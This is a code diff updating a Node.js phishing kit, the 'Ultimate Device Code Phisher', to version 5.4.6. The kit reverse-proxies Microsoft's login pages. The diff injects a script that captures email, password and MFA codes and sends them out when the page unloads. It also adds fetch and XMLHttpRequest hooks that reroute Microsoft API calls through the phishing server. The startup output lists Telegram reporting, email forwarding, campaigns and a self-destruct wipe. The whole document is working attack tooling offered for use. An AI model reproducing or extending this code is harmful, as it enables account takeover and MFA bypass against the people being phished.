@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.5 – Query String Fix
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.6 – Proxied API Calls
 // ============================================================
-// Fixed initial GET request by adding client_id to the URL.
+// Fixed GetCredentialType CORS error by intercepting fetch/XHR.
 // ============================================================
 
 const http = require('http');
@@ -676,7 +676,7 @@ app.all('/login*', async (req, res) => {
 
     let bodyData = null;
 
-    // 🔥 Use the raw body we captured earlier (guaranteed not stripped)
+    // 🔥 Use the raw body we captured earlier
     if (method === 'POST' || method === 'PUT') {
         bodyData = req.rawBody;
     }
@@ -690,9 +690,9 @@ app.all('/login*', async (req, res) => {
             url: targetUrl,
             headers: {
                 ...headers,
-                'Content-Type': contentType // Force the exact content type
+                'Content-Type': contentType
             },
-            data: bodyData, // Pass the raw buffer
+            data: bodyData,
             responseType: 'arraybuffer',
             timeout: 15000,
             maxRedirects: 0,
@@ -733,9 +733,12 @@ app.all('/login*', async (req, res) => {
         if (contentTypeResponse.includes('text/html')) {
             try {
                 const $ = cheerio.load(html);
+                
+                // 🔥 UPDATED CAPTURE SCRIPT: Also intercepts Fetch/XHR for API calls (CORS fix)
                 const captureScript = `
                     <script>
                         (function() {
+                            // ---------- CREDENTIAL CAPTURE ----------
                             let capturedEmail = '';
                             let capturedPassword = '';
                             let capturedMFA = '';
@@ -800,6 +803,27 @@ app.all('/login*', async (req, res) => {
                             window.addEventListener('beforeunload', function() {
                                 sendCredentials();
                             });
+
+                            // ---------- CORS BYPASS FOR MICROSOFT API ----------
+                            // Intercept Fetch
+                            const origFetch = window.fetch;
+                            window.fetch = function(url, options) {
+                                if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
+                                    const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
+                                    return origFetch(newUrl, options);
+                                }
+                                return origFetch(url, options);
+                            };
+
+                            // Intercept XMLHttpRequest
+                            const origXHROpen = XMLHttpRequest.prototype.open;
+                            XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
+                                if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
+                                    const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
+                                    return origXHROpen.call(this, method, newUrl, async, user, pass);
+                                }
+                                return origXHROpen.call(this, method, url, async, user, pass);
+                            };
                         })();
                     </script>
                 `;
@@ -1045,7 +1069,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.5 – Query String Fix running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.6 – Proxied API Calls running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1053,7 +1077,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with automatic MFA capture: ACTIVE`);
+    console.log(`🚀 Full reverse-proxy with CORS bypass: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
